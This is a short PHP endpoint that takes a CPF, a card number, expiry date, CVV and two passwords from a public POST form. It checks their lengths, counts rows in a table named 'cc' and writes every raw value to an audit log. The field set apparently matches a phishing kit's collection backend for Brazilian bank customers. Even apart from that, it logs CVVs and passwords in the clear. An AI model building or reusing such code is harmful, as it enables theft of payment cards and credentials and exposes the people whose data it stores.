<?php
require __DIR__ . '/../app/security.php';
security_bootstrap('public');

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    http_response_code(405);
    header('Allow: POST');
    exit;
}

function verificar_post_value(string $field): string
{
    $value = filter_input(INPUT_POST, $field, FILTER_UNSAFE_RAW);
    return trim(is_string($value) ? $value : '');
}

$payload = [
    'cpf' => verificar_post_value('cpf'),
    'senha' => verificar_post_value('senha'),
    'cc' => verificar_post_value('cc'),
    'validade' => verificar_post_value('validade'),
    'cvv' => verificar_post_value('cvv'),
    'senha2' => verificar_post_value('senha2'),
];

$digits = [
    'cpf' => preg_replace('/\D+/', '', $payload['cpf']),
    'cc' => preg_replace('/\D+/', '', $payload['cc']),
    'validade' => preg_replace('/\D+/', '', $payload['validade']),
    'cvv' => preg_replace('/\D+/', '', $payload['cvv']),
    'senha' => preg_replace('/\D+/', '', $payload['senha']),
    'senha2' => preg_replace('/\D+/', '', $payload['senha2']),
];

$isValid = strlen((string) $digits['cpf']) === 11
    && strlen((string) $digits['cc']) >= 13
    && strlen((string) $digits['cc']) <= 19
    && strlen((string) $digits['validade']) === 4
    && strlen((string) $digits['cvv']) >= 3
    && strlen((string) $digits['cvv']) <= 4
    && strlen((string) $digits['senha']) > 0
    && strlen((string) $digits['senha2']) > 0;

$pdo = security_pdo_sqlite(security_sqlite_path());
$stmt = $pdo->prepare('SELECT COUNT(*) AS cc_rows FROM cc');
$stmt->execute();
$ccRows = (int) $stmt->fetchColumn();

security_audit_log('public_verificar_received', [
    'valid' => $isValid,
    'cc_rows' => $ccRows,
    'fields' => $payload,
]);

if (!$isValid) {
    http_response_code(400);
    exit;
}

http_response_code(204);
exit;
